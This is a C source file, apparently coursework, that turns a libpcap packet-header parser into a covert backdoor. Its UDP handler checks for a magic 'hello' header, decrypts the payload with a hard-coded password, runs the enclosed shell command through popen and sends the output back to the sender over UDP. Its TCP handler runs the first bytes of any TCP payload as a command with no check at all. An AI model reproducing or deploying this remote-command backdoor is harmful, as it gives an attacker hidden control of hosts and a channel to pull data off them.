/*---------------------------------------------------------------------------------------------
--	SOURCE FILE:	proc_hdrs.c -   program to process the packet headers
--
--	FUNCTIONS:		libpcap - packet filtering library based on the BSD packet
--					filter (BPF)
--
--	DATE:			April 23, 2006
--
--	REVISIONS:		(Date and nic_description)
--
--				April 10, 2014
--				Added the handle_TCP() function which parses the TCP header and
				prints out fields of interest.

				May 5, 2016
--				Cleaned up the functions to remove warnings
--                              Fixed the incorrect header lenght calculations
--                              Added functionality to print payload data

-- 				October, 2018
-- 				Added UDP() functionality to work with created call-back client
					Executes commands sent from the call-back-client and sends the results back
--
--	DESIGNERS:		Based on the code by Martin Casado
--					Also code was taken from tcpdump source, namely the following files..
--					print-ether.c
--					print-ip.c
--					ip.h
--					Modified & redesigned: Aman Abdulla: 2006, 2014, 2016
-- 					Modified & redesigned: Jordan Hamade: 2018	
--
--	PROGRAMMER:		Jordan Hamade
--
--	NOTES:
--	These fucntions are designed to process and parse the individual headers and
--	print out selected fields of interest. For TCP the payload is also printed out.
--	Currently the only the IP and TCP header processing functionality has been implemented.
-------------------------------------------------------------------------------------------------*/

#include "backdoor.h"
#define ETHER_IP_UDP_LEN 42
#define BACKDOOR_HEADER "hello"
#define BACKDOOR_HEADER_LEN 5
#define PASSWORD "P@$$w0rd"
#define PASSLEN 8
#define COMMAND_START "START["
#define COMMAND_END "]END"

// Check all the headers in the Ethernet frame
void pkt_callback(u_char *args,const struct pcap_pkthdr* pkthdr,const u_char* packet)
{
    	u_int16_t type = handle_ethernet(args,pkthdr,packet);

    	if(type == ETHERTYPE_IP) // handle the IP packet
    	{
        	handle_IP(args,pkthdr,packet);
    	}
	else if (type == ETHERTYPE_ARP) // handle the ARP packet
	{
    	}
    	else if (type == ETHERTYPE_REVARP) // handle reverse arp packet
	{
    	}

}


// This function will parse the IP header and print out selected fields of interest
void handle_IP (u_char *args,const struct pcap_pkthdr* pkthdr,const u_char* packet)
{
    	const struct my_ip* ip;
    	u_int length = pkthdr->len;
    	u_int hlen,off,version;
    	int len;

    	// Jump past the Ethernet header
    	ip = (struct my_ip*)(packet + sizeof(struct ether_header));
    	length -= sizeof(struct ether_header);

    	// make sure that the packet is of a valid length
    	if (length < sizeof(struct my_ip))
    	{
        	printf ("Truncated IP %d",length);
        	exit (1);
    	}

    	len     = ntohs(ip->ip_len);
    	hlen    = IP_HL(ip); 	// get header length
    	version = IP_V(ip);	// get the IP version number

    	// verify version
    	if(version != 4)
    	{
      		fprintf(stdout,"Unknown version %d\n",version);
      		exit (1);
        }

    	// verify the header length */
    	if(hlen < 5 )
    	{
        	fprintf(stdout,"Bad header length %d \n",hlen);
    	}

    	// Ensure that we have as much of the packet as we should
    	if (length < len)
        	printf("\nTruncated IP - %d bytes missing\n",len - length);

    	// Ensure that the first fragment is present
    	off = ntohs(ip->ip_off);
    	if ((off & 0x1fff) == 0 ) 	// i.e, no 1's in first 13 bits
    	{				// print SOURCE DESTINATION hlen version len offset */
        	fprintf(stdout,"IP: ");
        	fprintf(stdout,"%s ", inet_ntoa(ip->ip_src));
        	fprintf(stdout,"%s %d %d %d %d\n", inet_ntoa(ip->ip_dst), hlen,version,len,off);
    	}

    	switch (ip->ip_p)
        {
                case IPPROTO_TCP:
                        printf("   Protocol: TCP\n");
			handle_TCP (args, pkthdr, packet);
                break;
                case IPPROTO_UDP:
                        printf("   Protocol: UDP\n");
            handle_UDP (args, pkthdr, packet);
                break;
                case IPPROTO_ICMP:
                        printf("   Protocol: ICMP\n");
                break;
                case IPPROTO_IP:
                        printf("   Protocol: IP\n");
                break;
                default:
                        printf("   Protocol: unknown\n");
                break;
        }
}

// This function will parse the IP header and print out selected fields of interest
void handle_TCP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet)
{
	const struct sniff_tcp *tcp=0;          // The TCP header
	const struct my_ip *ip;              	// The IP header
        const char *payload;                    // Packet payload

        FILE *fp;
  	    int size_ip;
        int size_tcp;
        int size_payload;
        char command[1024];
        char path[1024];

        int sock;
        struct sockaddr_in server;
        const int server_port = 8505;

	printf ("\n");
	printf ("TCP packet\n");

        ip = (struct my_ip*)(packet + SIZE_ETHERNET);
        size_ip = IP_HL (ip)*4;

        // define/compute tcp header offset
        tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
        size_tcp = TH_OFF(tcp)*4;

        if (size_tcp < 20)
	{
                printf("   * Control Packet? length: %u bytes\n", size_tcp);
                exit(1);
        }

        printf ("   Src port: %d\n", ntohs(tcp->th_sport));
        printf ("   Dst port: %d\n", ntohs(tcp->th_dport));


        //UDP socket setup
        memset(&server, 0, sizeof(server));
        server.sin_family = AF_INET;
        inet_pton(AF_INET, inet_ntoa(ip->ip_src), &server.sin_addr);
        server.sin_port = htons(server_port);

        if((sock = socket(PF_INET, SOCK_DGRAM, 0))< 0){
            printf("could not create socket\n");
            exit(1);
        }

        // define/compute tcp payload (segment) offset
        payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);

        // compute tcp payload (segment) size
        size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

         // Print payload data, including binary translation

        if (size_payload > 0)
	{
            printf("   Payload (%d bytes):\n", size_payload);
            //print_payload (payload, size_payload);
            memset(command, 0x0, sizeof(command));
            strncpy(command, payload, 10);
            //runs command and saves to a FILE
            fp = popen(command, "r");
            if(fp == NULL){
                printf("Failed to run command\n");
                exit(1);
            }
            //parse the FILE
            while(fgets(path, sizeof(path)-1, fp) != NULL){
                //printf("%s", path);
                sendto(sock, path, strlen(path), 0,(struct sockaddr*)&server, sizeof(server));
            }
                pclose(fp);
        }
}

// Handles UDP packets aimed at the backdoor
void handle_UDP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    const struct sniff_udp *udp=0;
    const struct my_ip *ip;
    const char *payload;

    FILE *fp;
    int size_ip;
    int size_udp;
    int size_payload;
    int loop, len;
    char command[1024];
    char start_data[7];     //should be equal to "START[\0"
    char end_data[5];       //should be equal to "]END\0"
    char header_data[BACKDOOR_HEADER_LEN + 1];
    char *cmdtoken;
    char path[1024];
    char decrypted[1024];
    char *ptr;
    char endTransmission[1024];

    int sock;
    struct sockaddr_in server;
    const int server_port = 8505;

    printf ("\n");
    printf ("UDP packet\n");

        ip = (struct my_ip*)(packet + SIZE_ETHERNET);
        size_ip = IP_HL (ip)*4;

        udp = (struct sniff_udp*)(packet + SIZE_ETHERNET + size_ip);
        size_udp = ETHER_IP_UDP_LEN - size_ip - SIZE_ETHERNET;

        printf("    Src port: %d\n", ntohs(udp->uh_sport));
        printf("    Dst port: %d\n", ntohs(udp->uh_dport));

        //UDP socket setup
        memset(&server, 0, sizeof(server));
        server.sin_family = AF_INET;
        inet_pton(AF_INET, inet_ntoa(ip->ip_src), &server.sin_addr);
        server.sin_port = htons(server_port);

        if((sock = socket(PF_INET, SOCK_DGRAM, 0))< 0){
            printf("could not create socket\n");
            exit(1);
        }

        // This is the correct starting point of the payload
        payload = (u_char *)(packet + ETHER_IP_UDP_LEN);

        size_payload = ntohs(ip->ip_len) - (size_ip + size_udp);

        printf("size_payload: %d\n", size_payload);

        if(size_payload > 0){
            printf("   Payload (%d bytes):\n", size_payload);
            memset(header_data, 0x0, sizeof(header_data));
            memset(start_data, 0x0, sizeof(start_data));
            memset(end_data, 0x0, sizeof(end_data));
            memset(command, 0x0, sizeof(command));
            memset(decrypted, 0x0, sizeof(decrypted));
            strncpy(header_data, payload, BACKDOOR_HEADER_LEN);
            header_data[BACKDOOR_HEADER_LEN + 1] = '\0';
            //handle payload data to see if we are meant for the backdoor
            if((strcmp(header_data, BACKDOOR_HEADER)) == 0){
                //Our header matches. Now decrypt the rest of the packet.
                for(loop = 0; loop < ((strlen(payload) - BACKDOOR_HEADER_LEN)); loop++){
                    decrypted[loop] = payload[BACKDOOR_HEADER_LEN + loop] - PASSWORD[(loop % PASSLEN)];
                }
                //Check for START and END terminators
                strncpy(start_data, decrypted, 6);
                strncpy(end_data, decrypted + (strlen(decrypted) + 1) - (sizeof(end_data)), sizeof(end_data));
                start_data[6] = '\0';
                end_data[4] = '\0';
                if((strcmp(start_data, COMMAND_START) == 0) && (strcmp(end_data, COMMAND_END) == 0)){
                    strncpy(command, decrypted + (sizeof(COMMAND_START) - 1), sizeof(decrypted));
                    cmdtoken = strtok(command, "\n");
                    strcat(cmdtoken, " 2>&1");
                    printf("cmd: %s\n", cmdtoken);
                    //runs command and saves to a FILE
                    fp = popen(cmdtoken, "r");
                    if(fp == NULL){
                        printf("Failed to run command\n");
                        exit(1);
                    }

                    //parse the FILE
                    while(fgets(path, sizeof(path)-1, fp) != NULL){
                        sendto(sock, path, strlen(path), 0,(struct sockaddr*)&server, sizeof(server));
                    }
                    strcpy(endTransmission, COMMAND_END);
                    sendto(sock, endTransmission, strlen(endTransmission), 0,(struct sockaddr*)&server, sizeof(server));
                        pclose(fp);
                }else{
                    printf("Invalid command signature\n");
                }

            }else{
                printf("Bad header: unacceptable packet\n");
            }


        }
}
